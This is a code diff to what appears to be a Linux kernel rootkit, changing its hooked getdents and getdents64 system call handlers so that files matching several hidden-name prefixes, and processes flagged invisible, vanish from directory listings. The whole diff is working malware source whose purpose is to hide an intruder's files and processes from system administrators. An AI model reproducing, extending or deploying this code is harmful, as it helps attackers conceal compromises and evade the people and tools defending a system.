@@ -168,19 +168,19 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
   while (off < ret) {
     dir = (void *)kdirent + off;
     for (i = 0; i < indexes; i++) {
-    if ((!proc &&
-    (memcmp(MAGIC_PREFIX[i], dir->d_name, strlen(MAGIC_PREFIX[i])) == 0))
-    || (proc &&
-    is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-      if (dir == kdirent) {
-        ret -= dir->d_reclen;
-        memmove(dir, (void *)dir + dir->d_reclen, ret);
-        continue;
-      }
-      prev->d_reclen += dir->d_reclen;
-    } else
-      if (i == indexes - 1) {
-      prev = dir;
+      if ((!proc && (memcmp(MAGIC_PREFIX[i], dir->d_name, strlen(MAGIC_PREFIX[i])) == 0)) || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+        if (dir == kdirent) {
+          ret -= dir->d_reclen;
+          memmove(dir, (void *)dir + dir->d_reclen, ret);
+          break;
+          continue;
+        }
+        prev->d_reclen += dir->d_reclen;
+        break;
+      } else {
+          if (i == indexes - 1) {
+            prev = dir;
+          }
       }
     }
     off += dir->d_reclen;
@@ -188,9 +188,9 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
   err = copy_to_user(dirent, kdirent, ret);
   if (err)
     goto out;
-out:
-  kfree(kdirent);
-  return ret;
+  out:
+    kfree(kdirent);
+    return ret;
 }
 
 asmlinkage int
@@ -227,19 +227,19 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
   while (off < ret) {
     dir = (void *)kdirent + off;
     for (i = 0; i < indexes; i++) {
-    if ((!proc &&
-    (memcmp(MAGIC_PREFIX[i], dir->d_name, strlen(MAGIC_PREFIX[i])) == 0))
-    || (proc &&
-    is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-      if (dir == kdirent) {
-        ret -= dir->d_reclen;
-        memmove(dir, (void *)dir + dir->d_reclen, ret);
-        continue;
-      }
-      prev->d_reclen += dir->d_reclen;
-    } else
-      if (i == indexes - 1) {
-      prev = dir;
+      if ((!proc && (memcmp(MAGIC_PREFIX[i], dir->d_name, strlen(MAGIC_PREFIX[i])) == 0)) || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+        if (dir == kdirent) {
+          ret -= dir->d_reclen;
+          memmove(dir, (void *)dir + dir->d_reclen, ret);
+          break;
+          continue;
+        }
+        prev->d_reclen += dir->d_reclen;
+        break;
+      } else {
+          if (i == indexes - 1) {
+            prev = dir;
+          }
       }
     }
     off += dir->d_reclen;
@@ -247,9 +247,9 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
   err = copy_to_user(dirent, kdirent, ret);
   if (err)
     goto out;
-out:
-  kfree(kdirent);
-  return ret;
+  out:
+    kfree(kdirent);
+    return ret;
 }
 
 void
